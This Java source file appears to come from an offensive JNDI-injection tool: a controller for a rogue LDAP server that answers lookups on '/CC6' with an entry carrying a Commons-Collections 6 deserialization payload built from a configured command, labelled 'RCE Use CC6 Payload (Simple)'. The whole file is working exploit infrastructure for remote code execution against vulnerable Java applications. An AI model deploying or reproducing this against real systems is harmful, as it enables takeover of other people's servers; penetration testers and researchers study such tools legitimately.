package org.sec.controller;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.sec.Config;
import org.sec.core.ldap.LdapController;
import org.sec.core.ldap.LdapMapping;
import org.sec.payload.CC6;

@LdapMapping(uri = "/CC6")
public class CC6Controller implements LdapController {
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String");
        e.addAttribute("javaSerializedData", CC6.getPayload(Config.cmd));
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public String getInfo() {
        return "RCE Use CC6 Payload (Simple)";
    }
}
